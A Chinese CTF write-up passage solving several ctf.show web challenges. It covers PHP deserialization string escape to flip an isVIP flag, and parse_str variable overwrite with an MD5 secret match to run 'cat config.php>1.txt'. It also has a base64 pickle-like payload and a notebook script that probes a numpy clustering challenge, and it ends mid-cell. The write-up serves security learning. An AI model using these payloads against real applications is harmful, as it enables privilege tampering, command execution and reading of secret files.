现有子串 \u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\t// 目标子串，长度为47 \u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34; //下一个可控变量字符串，长度为22 因为过滤时，admin变为hack，每出现一次admin，就会减少一个字符，和上面字符变多的情况相反，随着admin的数量增多，现有子串后面会逐渐缩短。 因为每次过滤的时候都会少1个字符，因此将admin字符重复22遍，使得下一个可控变量字符串（这里的22遍并不一定准确，因为有双引号的干扰） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hack\u0026#34;,$s); } $a = new user(\u0026#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\u0026#39;,\u0026#39;123456\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); echo $a_seri_filter; ?\u0026gt; 1 2 3 4 5 6 7 8 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:110:\u0026#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} s后面是110，需要读取到110个字符 从第一个引号开始，110个字符如下： hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34; 123456这个位置变成可控变量，在这里添加目标子串\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;} 注意：\nPHP反序列化的机制：不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量读取字符串。\n例如，前面是规定了有10个字符，但是只读到了9个就到了双引号，此时PHP会把双引号当做第10个字符。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hack\u0026#34;,$s); } $a = new user(\u0026#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\u0026#39;,\u0026#39;\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); echo $a_seri_filter; ?\u0026gt; 1 2 3 4 5 6 7 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:110:\u0026#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:47:\u0026#34;\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:47:\u0026#34; 此段字符长度为111 原因：替换之前目标子串的位置是123456，一共6个字符，替换之后目标子串47个字符，会造成计算的payload不准确 解决办法：多添加1个admin，补上缺少的字符。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hack\u0026#34;,$s); } $a = new user(\u0026#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\u0026#39;,\u0026#39;\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); echo $a_seri_filter; ?\u0026gt; 1 2 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:115:\u0026#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:47:\u0026#34;\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} 将序列化结果再反序列化之后，输出检查\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hack\u0026#34;,$s); } $a = new user(\u0026#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\u0026#39;,\u0026#39;\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); $a_seri_filter_unseri = unserialize($a_seri_filter); var_dump($a_seri_filter_unseri); ?\u0026gt; 1 2 3 4 5 6 7 8 9 输出结果： object(user)#2 (3) { [\u0026#34;username\u0026#34;]=\u0026gt; string(115) \u0026#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:47:\u0026#34;\u0026#34; [\u0026#34;password\u0026#34;]=\u0026gt; string(6) \u0026#34;123456\u0026#34; [\u0026#34;isVIP\u0026#34;]=\u0026gt; int(1) } 参考资料：PHP反序列化字符逃逸详解\npayload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 name：new_rookie base64编码：bmV3X3Jvb2tpZQ== newname： new_rookie sVid I0 sb. base64编码：bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg== /change?name=bmV3X3Jvb2tpZQ==\u0026amp;newname=bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg== /dacaiji?name=new_rookie 注意：name不可以随便给，题目环境的name是new_rookie repairman 1 2 3 4 5 URL： http://cc7958e5-7762-44cc-8332-7fd11130ad36.challenge.ctf.show/index.php?mode=1 页面内容： hello,the user!We may change the mode to repaie the server,please keep it unchanged 题目分析 根据题目提示，让mode=0，发现回显了源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 Your mode is the guest!hello,the repairman! \u0026lt;?php error_reporting(0); session_start(); $config[\u0026#39;secret\u0026#39;] = Array(); include \u0026#39;config.php\u0026#39;; if(isset($_COOKIE[\u0026#39;secret\u0026#39;])){ $secret =\u0026amp; $_COOKIE[\u0026#39;secret\u0026#39;]; }else{ $secret = Null; } if(empty($mode)){ $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;]); if(empty($mode)) { echo \u0026#39;Your mode is the guest!\u0026#39;; } } function cmd($cmd){ global $secret; echo \u0026#39;Sucess change the ini!The logs record you!\u0026#39;; exec($cmd); $secret[\u0026#39;secret\u0026#39;] = $secret; $secret[\u0026#39;id\u0026#39;] = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $_SESSION[\u0026#39;secret\u0026#39;] = $secret; } if($mode == \u0026#39;0\u0026#39;){ //echo var_dump($GLOBALS); if($secret === md5(\u0026#39;token\u0026#39;)){ $secret = md5(\u0026#39;test\u0026#39;.$config[\u0026#39;secret\u0026#39;]); } switch ($secret){ case md5(\u0026#39;admin\u0026#39;.$config[\u0026#39;secret\u0026#39;]): echo 999; cmd($_POST[\u0026#39;cmd\u0026#39;]); case md5(\u0026#39;test\u0026#39;.$config[\u0026#39;secret\u0026#39;]): echo 666; $cmd = preg_replace(\u0026#39;/[^a-z0-9]/is\u0026#39;, \u0026#39;hacker\u0026#39;,$_POST[\u0026#39;cmd\u0026#39;]); cmd($cmd); default: echo \u0026#34;hello,the repairman!\u0026#34;; highlight_file(__FILE__); } }elseif($mode == \u0026#39;1\u0026#39;){ echo \u0026#39;\u0026lt;/br\u0026gt;hello,the user!We may change the mode to repaie the server,please keep it unchanged\u0026#39;; }else{ header(\u0026#39;refresh:5;url=index.php?mode=1\u0026#39;); exit; } 关键代码1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 if($mode == \u0026#39;0\u0026#39;) { //echo var_dump($GLOBALS); if($secret === md5(\u0026#39;token\u0026#39;)) { $secret = md5(\u0026#39;test\u0026#39;.$config[\u0026#39;secret\u0026#39;]); } switch ($secret) { case md5(\u0026#39;admin\u0026#39;.$config[\u0026#39;secret\u0026#39;]): echo 999; cmd($_POST[\u0026#39;cmd\u0026#39;]); case md5(\u0026#39;test\u0026#39;.$config[\u0026#39;secret\u0026#39;]): echo 666; $cmd = preg_replace(\u0026#39;/[^a-z0-9]/is\u0026#39;, \u0026#39;hacker\u0026#39;,$_POST[\u0026#39;cmd\u0026#39;]); cmd($cmd); default: echo \u0026#34;hello,the repairman!\u0026#34;; highlight_file(__FILE__); } 1 2 3 4 5 通过分析上面的代码，发现要想拿到flag，进入admin的分支，来执行命令，因为test分支只能通过字母数字执行命令，这貌似是不可能的。因此就需要让$secret = md5(\u0026#39;admin\u0026#39;.$config[\u0026#39;secret\u0026#39;])。 secret变量完全可控， if(isset($_COOKIE[\u0026#39;secret\u0026#39;])){ ... } 如果存在名为 secret 的 cookie，则将 $_COOKIE[\u0026#39;secret\u0026#39;] 的引用赋值给 $secret 变量。 只是$config[\u0026#39;secret\u0026#39;]目前还不知道怎么赋值。 关键代码2：\n1 2 3 4 5 6 7 if(empty($mode)){ $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;]); if(empty($mode)) { echo \u0026#39;Your mode is the guest!\u0026#39;; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;]); 这里举个例子更好说明 例如，用户正在访问的 URL 是 https://example.com/path/to/page.php?param=value $_SERVER[\u0026#39;REQUEST_URI\u0026#39;] 的值是 /path/to/page.php?param=value。 $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]);： parse_url() 函数用于解析 URL，并返回一个关联数组，其中包含 URL 的各个组成部分。 通过 parse_url() 函数对$_SERVER[\u0026#39;REQUEST_URI\u0026#39;]进行解析。 解析后的结果存储在变量 $url 中，是一个关联数组。 $url的值是 Array ( [path] =\u0026gt; /path/to/page.php [query] =\u0026gt; param1=value1\u0026amp;param2=value2 ) parse_str($url[\u0026#39;query\u0026#39;]); parse_str() 函数用于将查询字符串解析为变量，并将其设置为当前符号表的条目。 其对 $url[\u0026#39;query\u0026#39;] 进行解析，并将解析后的参数和值设置为当前符号表中的变量。 解析后的结果： $param1 = \u0026#39;value1\u0026#39;; $param2 = \u0026#39;value2\u0026#39;; 1 所以通过parse_url和parse_str这两个关键函数，可以对$config[\u0026#39;secret\u0026#39;]进行变量覆盖。 知识点 $_SERVER[\u0026lsquo;REQUEST_URI\u0026rsquo;] $_SERVER[\u0026lsquo;REQUEST_URI\u0026rsquo;] 是 PHP 中的一个预定义变量，用于存储当前请求的 URI（Uniform Resource Identifier），即请求的完整 URL 路径。\nURL和URI的区别？ URL的作用\nURL一般是一个完整的链接，我们可以直接通过这个链接（URL）访问到一个网站，或者把这个URL复制到浏览器访问网站。\n使用URL时我们就是一个直接用户的角色，直接访问就可以。\nURI的作用\nURI并不是一个直接访问的链接，而是相对地址（相对于浏览器，URI等同于URL）。这种概念更多用于编程中，因为我们没必要每次编程都用绝对url来获取页面，这样还需要进行分割“http://xx/xxx”前面那一串，所以编程的时候直接request.getRequestURI就行了，如果重定向，需要用URL。\nURL继承了所有URI的内容，所以它比URI更加详细，但是URI是URL的父级。\nPHP parse_url函数 语法：\n1 parse_url(string $url, int $component = -1): mixed 参数：\n1 2 3 4 5 6 7 8 9 10 11 $url：要解析的 URL 字符串。 $component（可选）：用于指定返回结果中包含的部分。可以是以下常量之一： PHP_URL_SCHEME：返回协议（例如 http、https）。 PHP_URL_HOST：返回主机名。 PHP_URL_PORT：返回端口号。 PHP_URL_USER：返回用户名。 PHP_URL_PASS：返回密码。 PHP_URL_PATH：返回路径部分。 PHP_URL_QUERY：返回查询字符串部分。 PHP_URL_FRAGMENT：返回片段标识符（也称为锚点）部分。 默认值为 -1，表示返回包含所有部分的关联数组。 返回值：\n如果解析成功，将返回一个关联数组，包含 URL 的各个组成部分。 如果解析失败，将返回 false。\nPHP parse_str() 函数 parse_str() 函数把查询字符串解析到变量中。 注：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。 注：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。 PHP exec()函数 exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。\npayload 1 2 3 4 5 6 7 8 GET: /index.php?mode=0\u0026amp;config[secret]=r1one\u0026amp;secret=40234cce895a7b3058d4a4c241ae26d7 // MD5(adminr1one)：40234cce895a7b3058d4a4c241ae26d7 POST: cmd=cat config.php\u0026gt;1.txt 然后访问1.txt 这里关于secret的值， 可以单独设置Cookie:secret=40234cce895a7b3058d4a4c241ae26d7 也可以直接利用URL进行GET传参 因为，如果Cookie没有设置secret的值，secret为空，经过parse_str，进行变量覆盖，也会有值。 简单的数据分析 打开页面，发现\n1 访问http://49aa75ee-ea3f-4e12-b75f-ae589cf98959.challenge.ctf.show/source/model.txt得到源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 D = random.randint(100, 200) pData = [numpy.random.random(D)*100,numpy.random.random(D)*100,numpy.random.random(D)*100] try: data = request.form.getlist(\u0026#39;data[]\u0026#39;) data = list(map(float,data)) data = numpy.array(data) except: msg=\u0026#34;数据转换失败\u0026#34; try: distance =[numpy.linalg.norm(A-data) for A in pData] avgdist = numpy.mean(numpy.abs(distance - numpy.mean(distance))**2) if avgdist\u0026lt;0.001: msg= flag else: msg= f\u0026#34;您的数据与三个聚类中心的欧拉距离分别是\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;{distance}均方差为:{avgdist}\u0026#34; except: msg=\u0026#34;未提交数据或数据维度有误\u0026#34; 题目分析 1 2 这段代码的目的是对从请求中获取的数据进行处理，并计算数据与三个聚类中心的欧拉距离和均方差。 先生成三个D维向量，然后当提交一个向量时，会返回提交的向量与这三个向量的欧拉距离，当提交向量与这三个向量距离的平均值小于0.001时，显示flag。 payload 1 2 3 在理论上，NumPy可以处理任意大小的整数，包括非常大的整数。然而，在实际应用中，NumPy的整数类型的范围受限于计算机的内存和处理能力。 NumPy提供了不同精度的整数类型，如int8、int16、int32、int64等，以及对应的无符号整数类型。这些类型在存储整数时具有不同的位数和取值范围。例如，int64类型可以表示范围在-9223372036854775808到9223372036854775807之间的整数。 1 2 3 4 numpy处理数据， 直接超大数9999999999999999999999999999999999999999999999999999999999999999999999 得到flag 这里好像利用的就是numpy没办法处理这么大的数，所以满足了平均值小于0.001，得出了flag？ 官方payload 试了半天，没整明白，先放着吧\n1、先用随机数的方法，生成若干向量进行试探。取得这些向量与三个指定点的欧拉距离\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 rx=[ np.random.random(D)*100 for i in range(500)] ry=[] for i in tqdm.tqdm(rx): try: txt = requests.post(url,data={\u0026#39;data[]\u0026#39;:list(i)}).text # print(txt) ry.append(eval(re.findall(\u0026#34;(\\[.*\\])\u0026#34;,txt)[0])) if \u0026#34;flag\u0026#34; in txt: print(txt) break except : print(txt) break ry = np.array(ry) 2、使用一个畸形神经网络，求值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 class CTFNN(nn.Module): def __init__(self,D): super().__init__() self.L = nn.Linear(1,D) self.zero=torch.zeros(1) def forward(self, x): y = self.L(self.zero) return torch.linalg.norm(y-x) class loss(nn.Module): def __init__(self,*arc): super().__init__() def forward(self,x,y): return torch.abs(x-y) 训练之后，ctfmodel.L.bias.tolist() 即为所求点坐标。\n3、用另一个神经网络训练出一个距离三个点距离相等的点来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class CTFNN2(nn.Module): def __init__(self,D): super().__init__() self.L = nn.Linear(1,D) self.zero=torch.zeros(1) def forward(self): x = self.L(self.zero) dist =[torch.linalg.norm(A-x) for A in tp] dist=torch.stack(dist,0) y = torch.mean(torch.abs(dist - torch.mean(dist))**2) return y class loss2(nn.Module): def __init__(self,*arc): super().__init__() def forward(self,x): return torch.abs(x) 脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 { \u0026#34;cells\u0026#34;: [ { \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;execution_count\u0026#34;: None, \u0026#34;metadata\u0026#34;: { \u0026#34;collapsed\u0026#34;: False, \u0026#34;pycharm\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;#%%\\n\u0026#34; } }, \u0026#34;outputs\u0026#34;: [], \u0026#34;source\u0026#34;: [ \u0026#34;import requests\\n\u0026#34;, \u0026#34;import numpy as np\\n\u0026#34;, \u0026#34;import re\\n\u0026#34;, \u0026#34;import tqdm\\n\u0026#34;, \u0026#34;url=\u0026#39;http://49aa75ee-ea3f-4e12-b75f-ae589cf98959.challenge.ctf.show/\u0026#39;\\n\u0026#34;, \u0026#34;for D in range(100,200):\\n\u0026#34;, \u0026#34; txt = requests.post(url,data={\u0026#39;data[]\u0026#39;:[1]*D}).text\\n\u0026#34;, \u0026#34; if \u0026#39;维度有误\u0026#39; not in txt :\\n\u0026#34;, \u0026#34; # print(txt)\\n\u0026#34;, \u0026#34; break\\n\u0026#34;, \u0026#34;print(\u0026#39;D=\u0026#39;,D)\\n\u0026#34;, \u0026#34;rx=[ np.random.random(D)*100 for i in range(500)]\\n\u0026#34;, \u0026#34;ry=[]\\n\u0026#34;, \u0026#34;\\n\u0026#34;, \u0026#34;for i in tqdm.tqdm(rx):\\n\u0026#34;, \u0026#34; try:\\n\u0026#34;, \u0026#34; txt = requests.post(url,data={\u0026#39;data[]\u0026#39;:list(i)}).text\\n\u0026#34;, \u0026#34; # print(txt)\\n\u0026#34;, \u0026#34; ry.append(eval(re.findall(\\\u0026#34;(\\\\[.*\\\\])\\\u0026#34;,txt)[0]))\\n\u0026#34;, \u0026#34; if \\\u0026#34;flag\\\u0026#34; in txt:\\n\u0026#34;, \u0026#34; print(txt)\\n\u0026#34;, \u0026#34; break\\n\u0026#34;, \u0026#34; except :\\n\u0026#34;, \u0026#34; print(txt)\\n\u0026#34;, \u0026#34; break\\n\u0026#34;, \u0026#34;ry = np.array(ry)\u0026#34; ] }, { \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;execution_count\u0026#34;: None, \u0026#34;metadata\u0026#34;: { \u0026#34;collapsed\u0026#34;: False, \u0026#34;pycharm\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;#%%\\n\u0026#34; } }, \u0026#34;outputs\u0026#34;: [], \u0026#34;source\u0026#34;: [ \u0026#34;import torch, torch.nn as nn, torch.optim as optim\\n\u0026#34;, \u0026#34;from torch.utils.data import DataLoader,Dataset,TensorDataset\\n\u0026#34;, \u0026#34;class CTFNN(nn.Module):\\n\u0026#34;, \u0026#34; def __init__(self,D):\\n\u0026#34;, \u0026#34; super().__init__()\\n\u0026#34;, \u0026#34; self.L = nn.Linear(1,D)\\n\u0026#34;, \u0026#34; self.zero=torch.zeros(1)\\n\u0026#34;, \u0026#34; def forward(self, x):\\n\u0026#34;, \u0026#34; y = self.L(self.zero)\\n\u0026#34;, \u0026#34; return torch.linalg.norm(y-x)\\n\u0026#34;, \u0026#34;class loss(nn.Module):\\n\u0026#34;, \u0026#34; def __init__(self,*arc):\\n\u0026#34;, \u0026#34; super().__init__()\\n\u0026#34;, \u0026#34; def forward(self,x,y):\\n\u0026#34;, \u0026#34; return torch.abs(x-y)\u0026#34; ] }, { \u0026#34;cell_type\u0026#34;: \u0026#34;markdown\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;collapsed\u0026#34;: False, \u0026#34;pycharm\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;#%% md\\n\u0026#34; } }, \u0026#34;source\u0026#34;: [ \u0026#34;int\u0026#34; ] }, { \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;execution_count\u0026#34;: None, \u0026#34;metadata\u0026#34;: { \u0026#34;collapsed\u0026#34;: False, \u0026#34;pycharm\u0026#34;: { \u0026#34;is_executing\u0026#34;: True, \u0026#34;name\u0026#34;: \u0026#34;#%%\\n\u0026#34; } }, \u0026#34;outputs\u0026#34;: [], \u0026#34;source\u0026#34;: [ \u0026#34;import matplotlib.pyplot as plt\\n\u0026#34;, \u0026#34;p=[]\\n\u0026#34;, \u0026#34;for idx in range(3):\\n\u0026#34;, \u0026#34; ctf =CTFNN(D)\\n\u0026#34;, \u0026#34; los = []\\n\u0026#34;, \u0026#34; loss_function = loss()\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf.parameters(),lr=10)\\n\u0026#34;, \u0026#34; tx = torch.tensor(rx)\\n\u0026#34;, \u0026#34; ty = torch.tensor(ry[:,idx])\\n\u0026#34;, \u0026#34; td = TensorDataset(tx,ty)\\n\u0026#34;, \u0026#34; loss_fn = loss()\\n\u0026#34;, \u0026#34; for ep in tqdm.trange(150):\\n\u0026#34;, \u0026#34; if ep == 10:\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf.parameters(),lr=1)\\n\u0026#34;, \u0026#34; if ep == 40:\\n\u0026#34;, \u0026#34; los=[]\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf.parameters(),lr=0.1)\\n\u0026#34;, \u0026#34; if ep == 80:\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf.parameters(),lr=0.01)\\n\u0026#34;, \u0026#34; if ep == 130:\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf.parameters(),lr=0.001)\\n\u0026#34;, \u0026#34; for i in td:\\n\u0026#34;, \u0026#34; optimizer.zero_grad()\\n\u0026#34;, \u0026#34; y = ctf(i[0])\\n\u0026#34;, \u0026#34; lx = loss_fn(y,i[1])\\n\u0026#34;, \u0026#34; lx.backward()\\n\u0026#34;, \u0026#34; optimizer.step()\\n\u0026#34;, \u0026#34; los.append(lx.item())\\n\u0026#34;, \u0026#34; plt.figure(figsize=(10,3))\\n\u0026#34;, \u0026#34; plt.plot(los)\\n\u0026#34;, \u0026#34; plt.show()\\n\u0026#34;, \u0026#34; print(los[-1])\\n\u0026#34;, \u0026#34; p.append( ctf.L.bias.tolist())\\n\u0026#34;, \u0026#34;for px in p:\\n\u0026#34;, \u0026#34; txt = requests.post(url,data={\u0026#39;data[]\u0026#39;:px}).text\\n\u0026#34;, \u0026#34; print(re.findall(\u0026#39;您的数据与三个聚类中心的欧拉距离分别是:\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;(.*)均方差为\u0026#39;,txt)[0])\u0026#34; ] }, { \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;execution_count\u0026#34;: None, \u0026#34;metadata\u0026#34;: {}, \u0026#34;outputs\u0026#34;: [], \u0026#34;source\u0026#34;: [ \u0026#34;class CTFNN2(nn.Module):\\n\u0026#34;, \u0026#34; def __init__(self,D):\\n\u0026#34;, \u0026#34; super().__init__()\\n\u0026#34;, \u0026#34; self.L = nn.Linear(1,D)\\n\u0026#34;, \u0026#34; self.zero=torch.zeros(1)\\n\u0026#34;, \u0026#34; def forward(self):\\n\u0026#34;, \u0026#34; x = self.L(self.zero)\\n\u0026#34;, \u0026#34; dist =[torch.linalg.norm(A-x) for A in tp]\\n\u0026#34;, \u0026#34; dist=torch.stack(dist,0)\\n\u0026#34;, \u0026#34; y = torch.mean(torch.abs(dist - torch.mean(dist))**2)\\n\u0026#34;, \u0026#34; return y\\n\u0026#34;, \u0026#34; \\n\u0026#34;, \u0026#34;class loss2(nn.Module):\\n\u0026#34;, \u0026#34; def __init__(self,*arc):\\n\u0026#34;, \u0026#34; super().__init__()\\n\u0026#34;, \u0026#34; def forward(self,x):\\n\u0026#34;, \u0026#34; return torch.abs(x)\u0026#34; ] }, { \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;execution_count\u0026#34;: None, \u0026#34;metadata\u0026#34;: { \u0026#34;collapsed\u0026#34;: False, \u0026#34;pycharm\u0026#34;: { \u0026#34;is_executing\u0026#34;: True, \u0026#34;name\u0026#34;: \u0026#34;#%%\\n\u0026#34; } }, \u0026#34;outputs\u0026#34;: [], \u0026#34;source\u0026#34;: [ \u0026#34;tp=[]\\n\u0026#34;, \u0026#34;tp.append(torch.tensor(p[0]))\\n\u0026#34;, \u0026#34;tp.append(torch.tensor(p[1]))\\n\u0026#34;, \u0026#34;tp.append( torch.tensor(p[2]))\\n\u0026#34;, \u0026#34;\\n\u0026#34;, \u0026#34;ctf2 =CTFNN2(D)\\n\u0026#34;, \u0026#34;loss_function = loss2()\\n\u0026#34;, \u0026#34;optimizer = torch.optim.Adam(ctf2.parameters(),lr=5)\\n\u0026#34;, \u0026#34;tx = torch.tensor(rx)\\n\u0026#34;, \u0026#34;ty = torch.tensor(ry[:,2])\\n\u0026#34;, \u0026#34;td = TensorDataset(tx,ty)\\n\u0026#34;, \u0026#34;\\n\u0026#34;, \u0026#34;los=[]\\n\u0026#34;, \u0026#34;loss_fn = loss2()\\n\u0026#34;, \u0026#34;for ep in tqdm.trange(150):\\n\u0026#34;, \u0026#34; if ep == 10:\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf2.parameters(),lr=1)\\n\u0026#34;, \u0026#34; if ep == 40:\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.1)\\n\u0026#34;, \u0026#34; if ep == 80:\\n\u0026#34;, \u0026#34; los=[]\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.01)\\n\u0026#34;, \u0026#34; if ep == 130:\\n\u0026#34;, \u0026#34; optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.001)\\n\u0026#34;, \u0026#34; for i in range(100):\\n\u0026#34;, \u0026#34; optimizer.zero_grad()\\n\u0026#34;, \u0026#34; y = ctf2()\\n\u0026#34;, \u0026#34; lx = loss_fn(y)\\n\u0026#34;, \u0026#34; lx.backward()\\n\u0026#34;, \u0026#34; optimizer.step()\\n\u0026#34;, \u0026#34; los.append(lx.item())\\n\u0026#34;, \u0026#34;import matplotlib.pyplot as plt\\n\u0026#34;, \u0026#34;plt.figure(figsize=(10,3))\\n\u0026#34;, \u0026#34;plt.plot(los)\\n\u0026#34;, \u0026#34;print(los[-1])\u0026#34; ] }, { \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;execution_count\u0026#34;: None, \u0026#34;metadata\u0026#34;: { \u0026#34;collapsed\u0026#34;: False, \u0026#34;pycharm\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;#%%\\n\u0026#34; } }, \u0026#34;outputs\u0026#34;: [], \u0026#34;source\u0026#34;: [ \u0026#34;px = ctf2.L.bias.tolist()\\n\u0026#34;, \u0026#34;txt 